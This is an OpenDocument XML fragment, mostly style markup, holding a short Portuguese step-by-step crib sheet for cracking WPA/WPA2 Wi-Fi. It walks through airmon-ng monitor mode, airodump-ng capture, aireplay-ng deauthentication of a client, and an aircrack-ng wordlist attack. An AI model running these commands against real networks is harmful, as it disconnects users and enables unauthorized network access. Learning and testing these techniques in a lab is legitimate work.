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440" officeooo:paragraph-rsid="00141440"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties officeooo:rsid="00141440" officeooo:paragraph-rsid="00141440"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties officeooo:rsid="00141440" officeooo:paragraph-rsid="00141440"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties officeooo:rsid="00169807" officeooo:paragraph-rsid="00169807"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties officeooo:rsid="001975ac" officeooo:paragraph-rsid="00169807"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="0014b7f0"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="00182a7c"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="00183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brando WPA/WPA2</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">1 – Colocar placa wireless em modo monitor</text:p>
      <text:p text:style-name="P2">1 – airmon-ng start &lt;placa&gt;</text:p>
      <text:p text:style-name="P2"><text:tab/><text:span text:style-name="T1">airmon-ng check kill</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">2 – Escanear rede wireless</text:p>
      <text:p text:style-name="P2">2 - #airodump-ng &lt;placa&gt;</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">3 – Filtrar escaneamento</text:p>
      <text:p text:style-name="P2">3 - #airodump-ng –channel&lt;qual canal&gt; --bssid&lt;macdoAP&gt; --write&lt;nomedoarquivosalvo&gt; &lt;placa&gt;</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">4 – Esperar o cliente se conectar no AP</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P4"><text:span text:style-name="T3">4.1- D</text:span>errubar cliente</text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T3">4.1- </text:span>#aireplay-ng --deauth 100 -c&lt;macDoCLIENTE&gt; -e&lt;NomeDaRede&gt; &lt;placa&gt;</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">5 – Local onde possui uma wordlist no kali</text:p>
      <text:p text:style-name="P2">5 – #ls /usr/share/john/password.lst</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">6 – Tentar quebrar a chave com aircrack</text:p>
      <text:p text:style-name="P2">6 – #aircrack-ng -w /usr/share/john/password.lst &lt;caminhoDoArquivoSalvo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1:42:26.890022955</meta:creation-date>
    <dc:date>2015-09-25T17:44:25.708444280</dc:date>
    <meta:editing-duration>PT57M47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79" meta:character-count="591" meta:non-whitespace-character-count="520"/>
  </office:meta>
</office:document-meta>
</file>